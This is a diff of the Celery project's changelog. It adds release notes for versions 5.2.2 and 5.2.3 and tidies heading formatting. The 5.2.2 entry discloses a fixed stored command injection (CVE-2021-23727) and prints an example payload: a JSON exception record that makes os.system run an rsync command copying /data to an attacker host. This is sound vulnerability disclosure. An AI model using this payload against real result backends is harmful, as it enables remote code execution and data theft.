+++ Changelog.rst
@@ -8,18 +8,76 @@ This document contains change notes for bugfix & new features
 in the & 5.2.x series, please see :ref:`whatsnew-5.2` for
 an overview of what's new in Celery 5.2.
 
+.. _version-5.2.3:
+
+5.2.3
+=====
+
+:release-date: 2021-12-29 12:00 P.M UTC+6:00
+:release-by: Asif Saif Uddin
+
+- Allow redis >= 4.0.2.
+- Upgrade minimum required pymongo version to 3.11.1.
+- tested pypy3.8 beta (#6998).
+- Split Signature.__or__ into subclasses' __or__ (#7135).
+- Prevent duplication in event loop on Consumer restart.
+- Restrict setuptools>=59.1.1,<59.7.0.
+- Kombu bumped to v5.2.3
+- py-amqp bumped to v5.0.9
+- Some docs & CI improvements.
+
+
+.. _version-5.2.2:
+
+5.2.2
+=====
+
+:release-date: 2021-12-26 16:30 P.M UTC+2:00
+:release-by: Omer Katz
+
+- Various documentation fixes.
+- Fix CVE-2021-23727 (Stored Command Injection security vulnerability).
+
+    When a task fails, the failure information is serialized in the backend.
+    In some cases, the exception class is only importable from the
+    consumer's code base. In this case, we reconstruct the exception class
+    so that we can re-raise the error on the process which queried the
+    task's result. This was introduced in #4836.
+    If the recreated exception type isn't an exception, this is a security issue.
+    Without the condition included in this patch, an attacker could inject a remote code execution instruction such as:
+    ``os.system("rsync /data attacker@192.168.56.100:~/data")``
+    by setting the task's result to a failure in the result backend with the os,
+    the system function as the exception type and the payload ``rsync /data attacker@192.168.56.100:~/data`` as the exception arguments like so:
+
+    .. code-block:: python
+
+        {
+              "exc_module": "os",
+              'exc_type': "system",
+              "exc_message": "rsync /data attacker@192.168.56.100:~/data"
+        }
+
+    According to my analysis, this vulnerability can only be exploited if
+    the producer delayed a task which runs long enough for the
+    attacker to change the result mid-flight, and the producer has
+    polled for the task's result.
+    The attacker would also have to gain access to the result backend.
+    The severity of this security vulnerability is low, but we still
+    recommend upgrading.
+
 
 .. _version-5.2.1:
 
 5.2.1
-=======
+=====
+
 :release-date: 2021-11-16 8.55 P.M UTC+6:00
 :release-by: Asif Saif Uddin
 
 - Fix rstrip usage on bytes instance in ProxyLogger.
 - Pass logfile to ExecStop in celery.service example systemd file.
 - fix: reduce latency of AsyncResult.get under gevent (#7052)
-- Limit redis version: <4.0.0. 
+- Limit redis version: <4.0.0.
 - Bump min kombu version to 5.2.2.
 - Change pytz>dev to a PEP 440 compliant pytz>0.dev.0.
 - Remove dependency to case (#7077).
@@ -31,20 +89,22 @@ an overview of what's new in Celery 5.2.
 .. _version-5.2.0:
 
 5.2.0
-=======
+=====
+
 :release-date: 2021-11-08 7.15 A.M UTC+6:00
 :release-by: Asif Saif Uddin
 
 - Prevent from subscribing to empty channels (#7040)
 - fix register_task method.
 - Fire task failure signal on final reject (#6980)
-- Limit pymongo version: <3.12.1 (#7041) 
+- Limit pymongo version: <3.12.1 (#7041)
 - Bump min kombu version to 5.2.1
 
 .. _version-5.2.0rc2:
 
 5.2.0rc2
-=======
+========
+
 :release-date: 2021-11-02 1.54 P.M UTC+3:00
 :release-by: Naomi Elstein
 
@@ -72,7 +132,7 @@ an overview of what's new in Celery 5.2.
 .. _version-5.2.0rc1:
 
 5.2.0rc1
-=======
+========
 :release-date: 2021-09-26 4.04 P.M UTC+3:00
 :release-by: Omer Katz
 
@@ -99,6 +159,7 @@ an overview of what's new in Celery 5.2.
 
 5.2.0b3
 =======
+
 :release-date: 2021-09-02 8.38 P.M UTC+3:00
 :release-by: Omer Katz
 
@@ -126,6 +187,7 @@ an overview of what's new in Celery 5.2.
 
 5.2.0b2
 =======
+
 :release-date: 2021-08-17 5.35 P.M UTC+3:00
 :release-by: Omer Katz
 
@@ -140,6 +202,7 @@ an overview of what's new in Celery 5.2.
 
 5.2.0b1
 =======
+
 :release-date: 2021-08-11 5.42 P.M UTC+3:00
 :release-by: Omer Katz